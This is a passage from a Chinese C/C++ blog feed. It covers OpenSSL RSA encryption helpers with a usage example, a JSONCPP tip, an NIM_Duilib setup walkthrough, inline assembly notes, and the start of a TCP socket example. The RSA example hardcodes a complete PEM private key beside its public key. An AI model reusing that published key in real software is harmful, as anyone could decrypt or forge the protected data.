class="keyword">if</span> (strPublicKey.<span class="built_in">empty</span>()  strData.<span class="built_in">empty</span>())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 读取公钥</span></span><br><span class="line"> RSA* pRSAPublicKey = <span class="built_in">RSA_new</span>();</span><br><span class="line"> BIO* bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line"> <span class="built_in">BIO_write</span>(bio, strPublicKey.<span class="built_in">c_str</span>(), strPublicKey.<span class="built_in">size</span>());</span><br><span class="line"> pRSAPublicKey = <span class="built_in">PEM_read_bio_RSAPublicKey</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (pRSAPublicKey == <span class="literal">nullptr</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取密钥长度</span></span><br><span class="line"> <span class="type">int</span> nLen = <span class="built_in">RSA_size</span>(pRSAPublicKey);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 返回结果</span></span><br><span class="line"> std::string strRet;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 解密</span></span><br><span class="line"> <span class="type">char</span>* pEncode = <span class="keyword">new</span> <span class="type">char</span>[nLen + <span class="number">1</span>];</span><br><span class="line"> <span class="type">int</span> ret = <span class="built_in">RSA_public_decrypt</span>(strData.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)strData.<span class="built_in">c_str</span>(), (<span class="type">unsigned</span> <span class="type">char</span>*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);</span><br><span class="line"> <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     strRet = std::<span class="built_in">string</span>(pEncode, ret);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 释放资源</span></span><br><span class="line"> <span class="keyword">delete</span>[] pEncode;</span><br><span class="line"> <span class="built_in">RSA_free</span>(pRSAPublicKey);</span><br><span class="line"> <span class="built_in">CRYPTO_cleanup_all_ex_data</span>();</span><br><span class="line"> <span class="keyword">return</span> strRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RSA使用实例"><a href="#RSA使用实例" class="headerlink" title="RSA使用实例"></a>RSA使用实例</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RSA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string privateKey = <span class="string">&quot;-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA9Bhk806dD+exe+rnBEInMhJ9zaE0Ok/3iscSiT9uI/mKdtj2\nQfQ4QH9yRHbIm+yFaPo+xOd2jVjJcJtDiHFk/4IjuE65OWaI7wryMa5/SP8GijNm\nDpPHNbNVfGrL+qL7+H6tZZ9ggFxgE2bqw97MBAW63DtAzeFeQyleHtxUpwRONazU\nYOhz2CZAqOUSoxwztx8CWtZSCNOV4cs67e7Q/uyuZPIxlS2z2MgI65/ez4vqZkj6\nbJHHb5c7gd4MMbnZ54xWI+S3mtcrOF8SV5ITTtt+tgGygm1kNeasKJRRqKqib2IE\nuRo1taKKr++Q9hSBk95saqcKkovyqinr6v1yCQIDAQABAoIBAQChfwJLd9eyjjh/\nJAt0ZdBI8LMLOXy0l/PPfaZl5/GXG6Lgvusu98W/5pJTecOAZhxeODMPU5S8L+IW\n/qLPwzZvVksLxgoGUDCI91UGSc0tHo3VIeyD+IH0pZIJnx8V1H+hCS7v7WKLipKG\nQ7FPpjiU8LWQwCNAE7up89Sx1lSrqoLMf5oyKbZ42Jld0oFBmljp/EW6Mo7tvQlv\nI5tAYccNHKvVwqYk1VMEU9LBqHDLpJXeRMxlxQTB2cfEr/CaAkCJE2mf5REFgsuB\nJ36AwRfKLcwFDPCv9r850l+AYh5NRlkp3FwIi+s5obpMGUfnCdcQMBmcerwwkTyf\ntoUl892BAoGBAPpkQcIGBiegPncUih9RXvEbNx/lmuqncWTd6DcjMuX2Of2ll32V\n1g4Nc8SzfHl3TZPe0qTN61NqH8ZIubNObz+5C8Fa9k+fSeQIbE5iYx2U+9ZLLmFg\nSq7QcAxprWIm5Bu7r6XWzPJtrIjoJ0JF0T3oxITKnaJiCIDhPoSTpPFrAoGBAPmQ\nCMnj1ccB+K7/ODFbx05MDWONpkjFonrQnBrRXThoRklLRA5DAYsxT5iLS7fJ2mKa\nk13eyJZdtJ1JD6DPuGcai/7ZeGn/l2E8fpNapCPyhQeG1CIbqwa6MGGqfPQjqTQ7\nmWWoEH/lEvwH5yx9hlh8ZKnFUyIHoBV8qvMrjiNbAoGBAKBa4q4SU5C/FCII+mgS\nIZ6Bkm0QC4Vp1LoHT3c4SJlzdjIWAY3BDsQTI2f+lqHnoLwpgHdhFOtn1I+U9bB6\nc864gGnFCmd1mMm8Bziv09AXIK1dmodsNof8HzYj25E3XPDR4yxvAvPi/xLysmnD\n8rwWPPzaEdfztoRrPDGFqKWfAoGBAIHh0HEiPlRAVmjdMyWdGnFJa35wbiZZlWJN\nx7C9XcLJoirrHRQ/E0KZ+07s0A9q4lmHEUM9ey+mvSVOrO+Iq/QdANc131FrUCGv\nFkEiX2LGCS4NocHOnIf3xs5NqJJ3LMyeaAtcGJo3YlYA1vN0sMLEmq8wnz+KsGn+\nZAoClQsZAoGAcsOZnAUfRpdu5H1femhlU83MzpdDNsIcgEp6m0on0i4q/e4n2VgJ\nBXi1/K1tbnU2cU6A4FmLlJ1i9Lf7JAdycylRm5BG9ynXeb3uligxh0kN5SvIiADY\n7MLCB6DyqyXaD7uf903lWJOOlBQpL+aypUAQ5jLyr9zaVDiDwuzPAYU=\n-----END RSA PRIVATE KEY-----&quot;</span>;</span><br><span class="line">string publicKey = <span class="string">&quot;-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEA9Bhk806dD+exe+rnBEInMhJ9zaE0Ok/3iscSiT9uI/mKdtj2QfQ4\nQH9yRHbIm+yFaPo+xOd2jVjJcJtDiHFk/4IjuE65OWaI7wryMa5/SP8GijNmDpPH\nNbNVfGrL+qL7+H6tZZ9ggFxgE2bqw97MBAW63DtAzeFeQyleHtxUpwRONazUYOhz\n2CZAqOUSoxwztx8CWtZSCNOV4cs67e7Q/uyuZPIxlS2z2MgI65/ez4vqZkj6bJHH\nb5c7gd4MMbnZ54xWI+S3mtcrOF8SV5ITTtt+tgGygm1kNeasKJRRqKqib2IEuRo1\ntaKKr++Q9hSBk95saqcKkovyqinr6v1yCQIDAQAB\n-----END RSA PUBLIC KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> std::string strTest = <span class="string">&quot;测试文本&quot;</span>;</span><br><span class="line"> std::string strRet;</span><br><span class="line"> <span class="comment">// 测试私钥加密公钥解密</span></span><br><span class="line"> <span class="comment">//strRet = RSAPrivateEncrypt(privateKey, strTest);</span></span><br><span class="line"> <span class="comment">//cout &lt;&lt; strRet &lt;&lt; endl;</span></span><br><span class="line"> <span class="comment">//strRet = RSAPublicDecrypt(publicKey, strRet);</span></span><br><span class="line"> <span class="comment">//cout &lt;&lt; strRet &lt;&lt; endl;</span></span><br><span class="line"> <span class="comment">// 测试公钥加密私钥解密</span></span><br><span class="line"> strRet = <span class="built_in">RSAPublicEncrypt</span>(publicKey, strTest);</span><br><span class="line"> cout &lt;&lt; strRet &lt;&lt; endl;</span><br><span class="line"> strRet = <span class="built_in">RSAPrivateDecrypt</span>(privateKey, strRet);</span><br><span class="line"> cout &lt;&lt; strRet &lt;&lt; endl;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>上面的我想必你一定学会怎么配置openssl和使用他了，那么再说一个更简单的使用办法就是使用vcpkg可以非常简单的编译并使用openssl库，哈哈哈哈哈哈哈哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONCPP去除格式化输出</title>
      <link href="/e0315948408b/"/>
      <url>/e0315948408b/</url>
      
        <content type="html"><![CDATA[<p>详细代码如下所示：<br><strong>旧版</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧版会提示api过时，所以需要加上下面宏代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable: 4996)</span></span><br><span class="line">    Json::FastWriter writer;</span><br><span class="line">    <span class="keyword">auto</span> strRes = writer.<span class="built_in">write</span>(root);</span><br></pre></td></tr></table></figure><p><strong>新版</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Json::StreamWriterBuilder streamWriterBuilder;</span><br><span class="line"><span class="comment">// 设置streamWriterBuilder的属性indentation为空即可去除\n\t格式化</span></span><br><span class="line">streamWriterBuilder[<span class="string">&quot;indentation&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> strRes = Json::<span class="built_in">writeString</span>(streamWriterBuilder, root);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsoncpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NIM_Duilib快速入门</title>
      <link href="/72bd276a211c/"/>
      <url>/72bd276a211c/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步：创建Windows-桌面向导"><a href="#第一步：创建Windows-桌面向导" class="headerlink" title="第一步：创建Windows 桌面向导"></a>第一步：创建Windows 桌面向导</h1><p>1、解决方案和项目不放在同一目录中</p><p><img src="/../uploads/2021/10/301499632.png" alt="kv253vbx.png" title="kv253vbx.png"></p><p>2、不勾选任何选项</p><p><img src="/../uploads/2021/10/1519034515.png" alt="kv254jqt.png" title="kv254jqt.png"></p><p>3、删除多余代码只保留如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DuilibDemo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此处放置代码。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二步：配置项目环境"><a href="#第二步：配置项目环境" class="headerlink" title="第二步：配置项目环境"></a>第二步：配置项目环境</h1><p>1、创建bin&#x2F;libs&#x2F;kits&#x2F;tmp目录</p><p><img src="/../uploads/2021/10/1875283345.png" alt="kv2560bb.png" title="kv2560bb.png"></p><p>2、将刚才下好的NIM_Duilib中的base&#x2F;build&#x2F;duilib 拷贝至kits文件中</p><p><img src="/../uploads/2021/10/1101694911.png" alt="kv256cz4.png" title="kv256cz4.png"></p><p>3、将base项目和duilib项目加入到我们的解决方案中</p><p><img src="/../uploads/2021/10/2784357384.png" alt="kv2570o0.png" title="kv2570o0.png"></p><p><img src="/../uploads/2021/10/3555534156.png" alt="kv2577lj.png" title="kv2577lj.png"></p><p>4、配置base项目和duilib项目的设置<br>a. 输出目录改为刚刚的libs目录路径<br>b. 中间目录改为刚刚的tmp目录路径<br>c. Windows SDK选择自己的版本<br>d. 平台工具集要和自己的项目一致</p><p><img src="/../uploads/2021/10/870352896.png" alt="kv258uah.png" title="kv258uah.png"></p><p>5、配置自己的项目<br>a. 输出路径改为bin目录路径<br>b. 平台工具集要和base项目、duilib项目一致</p><p><img src="/../uploads/2021/10/191247089.png" alt="kv259ooo.png" title="kv259ooo.png"></p><p>6、将base项目和duilib项目引入我们的项目中</p><p><img src="/../uploads/2021/10/3034430713.png" alt="kv25a5sr.png" title="kv25a5sr.png"></p><p><img src="/../uploads/2021/10/2460946652.png" alt="kv25ab0u.png" title="kv25ab0u.png"></p><p>7、将kits文件加入我们项目的包含路径中</p><p><img src="/../uploads/2021/10/2225486304.png" alt="kv25ao6w.png" title="kv25ao6w.png"></p><p>8、设置 <code>Debug</code> 模式下运行库为 <code>多线程调试(/MTd)</code></p><p><img src="/../uploads/2021/10/3160573520.png" alt="kv25bb6s.png" title="kv25bb6s.png"></p><p>9、设置 <code>Release</code> 模式下运行库为 <code>多线程(/MT)</code></p><p><img src="/../uploads/2021/10/1880326792.png" alt="kv25bzhb.png" title="kv25bzhb.png"></p><p>10、在我们项目中的 framework.h 文件中添加如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base 头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base/base.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// duilib 头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;duilib/UIlib.h&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/4272976874.png" alt="kv25dzyd.png" title="kv25dzyd.png"></p><p>11、在wWinMain函数上添加 <code>ThreadId</code> 枚举类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">ThreadId</span></span><br><span class="line">&#123;</span><br><span class="line">    kThreadUI</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/3035849940.png" alt="kv25ey00.png" title="kv25ey00.png"></p><h1 id="第三步：创建一个窗口"><a href="#第三步：创建一个窗口" class="headerlink" title="第三步：创建一个窗口"></a>第三步：创建一个窗口</h1><p>1、从NIM_Duilib项目中的bin目录拷贝resources文件到我们的bin路径下</p><p><img src="/../uploads/2021/10/3644157836.png" alt="kv25g2qs.png" title="kv25g2qs.png"></p><p><img src="/../uploads/2021/10/885163166.png" alt="kv25g8a8.png" title="kv25g8a8.png"></p><p>2、将 <code>NIM_Duilib_Framework-master\examples\basic</code> 路径下的 <code>basic_form.h</code> 文件和 <code>basic_form.cpp</code> 文件拷贝到我们的项目中</p><p><img src="/../uploads/2021/10/2518028800.png" alt="kv25gu30.png" title="kv25gu30.png"></p><p><img src="/../uploads/2021/10/3354486457.png" alt="kv25gye1.png" title="kv25gye1.png"></p><p>3、将 <code>basic_form.h</code> 文件和 <code>basic_form.cpp</code> 文件添加至我们的项目中</p><p><img src="/../uploads/2021/10/235249404.png" alt="kv25hzqn.png" title="kv25hzqn.png"></p><p>4、在wWinMain的头文件中加入如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainThread</span> : <span class="keyword">public</span> nbase::FrameworkThread</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MainThread</span>() : nbase::<span class="built_in">FrameworkThread</span>(<span class="string">&quot;MainThread&quot;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">MainThread</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 虚函数，初始化主线程</span></span><br><span class="line"><span class="comment">    * @return void    无返回值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Init</span><span class="params">()</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 虚函数，主线程退出时，做一些清理工作</span></span><br><span class="line"><span class="comment">    * @return void    无返回值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Cleanup</span><span class="params">()</span> <span class="keyword">override</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/1830130885.png" alt="kv25il7t.png" title="kv25il7t.png"></p><p>5、在wWinMain函数中加入如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建主线程</span></span><br><span class="line">MainThread thread;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行主线程循环</span></span><br><span class="line">thread.<span class="built_in">RunOnCurrentThreadWithLoop</span>(nbase::MessageLoop::kUIMessageLoop);</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/2548184910.png" alt="kv25j9b2.png" title="kv25j9b2.png"></p><p>6、实例化MainThread类中的 <code>Init()</code> 函数和 <code>Cleanup()</code> 函数<br>7、在 <code>Init()</code> 函数中加入如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nbase::ThreadManager::<span class="built_in">RegisterThread</span>(kThreadUI);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取资源路径，初始化全局参数</span></span><br><span class="line"><span class="comment">// 默认皮肤使用 resources\\themes\\default</span></span><br><span class="line"><span class="comment">// 默认语言使用 resources\\lang\\zh_CN</span></span><br><span class="line"><span class="comment">// 如需修改请指定 Startup 最后两个参数</span></span><br><span class="line">std::wstring theme_dir = nbase::win32::<span class="built_in">GetCurrentModuleDirectory</span>();</span><br><span class="line">ui::GlobalManager::<span class="built_in">Startup</span>(theme_dir + <span class="string">L&quot;resources\\&quot;</span>, ui::<span class="built_in">CreateControlCallback</span>(), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/2423979755.png" alt="kv25k5k0.png" title="kv25k5k0.png"></p><p>8、在 <code>Cleanup()</code> 函数中加入如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ui::GlobalManager::<span class="built_in">Shutdown</span>();</span><br><span class="line"><span class="built_in">SetThreadWasQuitProperly</span>(<span class="literal">true</span>);</span><br><span class="line">nbase::ThreadManager::<span class="built_in">UnregisterThread</span>();</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/1116747775.png" alt="kv25kuuo.png" title="kv25kuuo.png"></p><p>9、引入头文件 <code>basic_form.h</code> 并在 <code>Init()</code> 函数添加如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个默认带有阴影的居中窗口</span></span><br><span class="line">BasicForm* window = <span class="keyword">new</span> <span class="built_in">BasicForm</span>();</span><br><span class="line">window-&gt;<span class="built_in">Create</span>(<span class="literal">NULL</span>, BasicForm::kClassName.<span class="built_in">c_str</span>(), WS_OVERLAPPEDWINDOW &amp; ~WS_MAXIMIZEBOX, <span class="number">0</span>);</span><br><span class="line">window-&gt;<span class="built_in">CenterWindow</span>();</span><br><span class="line">window-&gt;<span class="built_in">ShowWindow</span>();</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/958973047.png" alt="kv25m4rj.png" title="kv25m4rj.png"></p><p>10、修改 <code>basic_form.cpp</code> 文件中的头文件 <code>stdafx.h</code> 改为我们的 <code>framework.h</code><br>11、至此项目配置成功</p><p><img src="/../uploads/2021/10/205563894.png" alt="kv25mz8u.png" title="kv25mz8u.png"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> NIM_Duilib </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NIM_Duilib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内联汇编与裸函数</title>
      <link href="/e2ddb6e7d259/"/>
      <url>/e2ddb6e7d259/</url>
      
        <content type="html"><![CDATA[<h1 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h1><hr><p>求数组长度 <code>LENGTH</code> 数组名<br>求数组大小 <code>SIZE</code> 数组名<br>求数组类型大小 <code>TYPE</code> 数组名<br>内联汇编不可以使用<strong>db</strong> <strong>dw</strong> <strong>dq</strong>等… 只能使用<strong>_emit</strong>定义，且一次只能定义一个字节<br>例子：定义三个0x90字节</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">  _emit <span class="number">0x90</span></span><br><span class="line">  _emit <span class="number">0x90</span></span><br><span class="line">  _emit <span class="number">0x90</span></span><br><span class="line">  mov eax, eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><p>可以有局部变量，但是需要自己抬栈，否则会导致堆栈不平衡，使用宏 <code>__LOCAL_SIZE</code> ,这个宏会自动计算裸函数局部变量的大小。<br>例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> nValue = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  __asm &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov  ebp, esp</span><br><span class="line">      sub esp, __LOCAL_SIZE</span><br><span class="line">        ...</span><br><span class="line">        leave  <span class="comment">//mov esp, ebp  pop ebp</span></span><br><span class="line">        retn 参数个数 * <span class="keyword">sizeof</span> 参数类型</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Socket例子</title>
      <link href="/bd957a93c785/"/>
      <url>/bd957a93c785/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP例子"><a href="#TCP例子" class="headerlink" title="TCP例子"></a>TCP例子</h1><hr><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 